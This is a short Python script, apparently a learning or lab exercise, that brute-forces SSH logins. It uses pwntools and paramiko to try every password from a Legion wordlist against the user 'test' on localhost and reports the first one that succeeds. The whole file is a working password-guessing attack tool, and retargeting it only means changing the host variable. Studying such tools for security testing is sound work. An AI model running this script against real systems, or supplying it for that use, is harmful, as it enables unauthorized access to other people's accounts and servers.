from pwn import *
import paramiko

host = "127.0.0.1"
username = "test"
attempts = 0

#read passwords file
with open("/usr/share/legion/wordlists/ssh-password.txt", "r") as password_list:
    for password in password_list:
        password = password.strip("\n")
        try:
            print("[{}] Attempting password: '{}'".format(attempts, password))
            # SSH - authentication
            response = ssh(host=host, user=username, password=password, timeout=1)
            
            # SSH successful
            if response.connected():
                print("[>] Valid password found: '{}'".format(password))
                response.close()
                break
            
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid password!")
        
        attempts += 1